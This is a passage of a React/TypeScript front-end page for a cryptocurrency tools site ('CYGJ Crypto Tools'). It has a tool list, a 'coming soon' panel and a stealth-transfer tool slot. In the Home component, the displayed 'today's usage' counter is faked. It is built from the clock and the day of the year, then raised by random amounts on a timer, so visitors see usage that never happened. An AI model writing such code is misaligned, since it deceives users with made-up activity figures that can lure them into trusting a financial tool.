            <div className="mt-2 flex items-center text-xs">
              <div className="animate-spin rounded-full h-3 w-3 border-b-2 border-[#d4af37] mr-2"></div>
              <span>处理中...</span>
            </div>
          )}
        </div>
      )}

      {/* Result - Only show on error */}
      {result && !result.success && (
        <div className="mt-4 p-4 rounded-lg text-sm bg-red-900/20 border border-red-500/30">
          <h3 className="font-semibold mb-2 text-red-400">
            ❌ 执行失败
          </h3>
          <p className="text-xs text-red-300">{result.error}</p>
        </div>
      )}
    </div>
  );
}

// 即将推出组件
function ComingSoonApp({ tool }: { tool: any }) {
  return (
    <div className="bg-white rounded-xl shadow-lg p-6 text-center">
      <div className="text-6xl mb-4">{tool.icon}</div>
      <h2 className="text-2xl font-bold mb-2">{tool.name}</h2>
      <p className="text-gray-600 mb-6">{tool.description}</p>
      <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
        <p className="text-yellow-700 font-semibold">🚧 即将推出</p>
        <p className="text-sm text-gray-600 mt-2">敬请期待...</p>
      </div>
    </div>
  );
}

export default function Home() {
  const [lang, setLang] = useState<"en" | "zh">("en");
  const [selectedTool, setSelectedTool] = useState(tools[0]);
  const [dailyUsage, setDailyUsage] = useState(0);

  // 初始化今日使用次数
  useEffect(() => {
    const now = new Date();
    const dayMinutes = now.getHours() * 60 + now.getMinutes();
    const dayOfYear = Math.floor((now.getTime() - new Date(now.getFullYear(), 0, 0).getTime()) / 86400000);
    const baseUsage = 500 + (dayOfYear * 37) % 300 + Math.floor(dayMinutes / 2);
    setDailyUsage(baseUsage);
  }, []);
  
  // 动态增长今日使用次数
  useEffect(() => {
    const interval = setInterval(() => {
      setDailyUsage(prev => {
        const increase = Math.random() > 0.3 ? Math.floor(Math.random() * 3) : 0;
        return prev + increase;
      });
    }, 15000 + Math.random() * 20000);

    return () => clearInterval(interval);
  }, []);

  return (
    <div className="min-h-screen bg-[#0a0a0a]">
      {/* Header */}
      <header className="bg-[#0a0a0a] border-b border-[#d4af37]/20 sticky top-0 z-10 backdrop-blur-sm">
        <nav className="container mx-auto px-6 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-3">
              <img src="/logo.png" alt="CYGJ Logo" className="w-10 h-10" />
              <span className="text-2xl font-bold text-white">CYGJ Crypto Tools</span>
            </div>
            <button
              onClick={() => setLang(lang === "en" ? "zh" : "en")}
              className="flex items-center gap-2 px-4 py-2 rounded-lg bg-[#1a1a1a] hover:bg-[#2a2a2a] border border-[#d4af37]/30 hover:border-[#d4af37] text-sm font-medium transition text-white"
            >
              <Globe className="w-4 h-4 text-[#d4af37]" />
              {lang === "en" ? "中文" : "EN"}
            </button>
          </div>
        </nav>
      </header>

      <div className="container mx-auto px-6 py-8">
        <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
          {/* Left Sidebar - Tool List */}
          <div className="lg:col-span-1">
            <div className="bg-[#1a1a1a] border border-[#d4af37]/20 rounded-xl p-4 sticky top-24">
              <h2 className="text-lg font-bold mb-4 text-[#d4af37]">工具列表</h2>
              <div className="space-y-2">
                {tools.map((tool) => (
                  <button
                    key={tool.id}
                    onClick={() => setSelectedTool(tool)}
                    className={`w-full text-left p-3 rounded-lg transition-all duration-300 ${
                      selectedTool.id === tool.id
                        ? "bg-gradient-to-r from-[#d4af37]/20 to-[#ffd700]/10 border border-[#d4af37] shadow-lg shadow-[#d4af37]/20"
                        : "bg-[#0a0a0a] border border-[#d4af37]/10 hover:border-[#d4af37]/30 hover:shadow-md hover:shadow-[#d4af37]/10"
                    }`}
                  >
                    <div className="flex items-center space-x-3">
                      <span className="text-2xl">{tool.icon}</span>
                      <div className="flex-1 min-w-0">
                        <p className={`font-semibold text-sm truncate ${
                          selectedTool.id === tool.id ? "text-[#d4af37]" : "text-white"
                        }`}>{tool.name}</p>
                        <p className={`text-xs truncate ${
                          selectedTool.id === tool.id ? "text-[#d4af37]/70" : "text-gray-500"
                        }`}>
                          {tool.category === "privacy" ? "隐私工具" : 
                           tool.category === "wallet" ? "钱包工具" :
                           tool.category === "defi" ? "DeFi 工具" : "数据分析"}
                        </p>
                      </div>
                      {tool.status === "active" && (
                        <span className="flex-shrink-0 w-2 h-2 bg-[#10b981] rounded-full shadow-lg shadow-[#10b981]/50"></span>
                      )}
                    </div>
                  </button>
                ))}
              </div>

              {/* Tool Info */}
              <div className="mt-6 pt-6 border-t border-[#d4af37]/20">
                <div className="text-center mb-4">
                  <div className="text-4xl mb-2">{selectedTool.icon}</div>
                  <h3 className="font-bold text-sm text-white">{selectedTool.name}</h3>
                  <p className="text-xs text-gray-400 mt-1">{selectedTool.description}</p>
                </div>

                {selectedTool.status === "active" && (
                  <>
                    <div className="grid grid-cols-2 gap-2 mb-4">
                      <div className="bg-[#0a0a0a] border border-[#d4af37]/20 p-2 rounded text-center">
                        <div className="text-lg font-bold text-[#d4af37]">{dailyUsage}</div>
                        <div className="text-xs text-gray-400">今日使用</div>
                      </div>
                      <div className="bg-[#0a0a0a] border border-[#10b981]/20 p-2 rounded text-center">
                        <div className="text-lg font-bold text-[#10b981]">{selectedTool.users}</div>
                        <div className="text-xs text-gray-400">总用户</div>
                      </div>
                    </div>
                  </>
                )}
              </div>
            </div>
          </div>

          {/* Right Panel - Application */}
          <div className="lg:col-span-3">
            {selectedTool.status === "active" ? (
              selectedTool.id === 1 ? (
                <StealthTransferApp />
              ) : (
                <ComingSoonApp tool={selectedTool} />
              )
            ) : (
              <ComingSoonApp tool={selectedTool} />
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
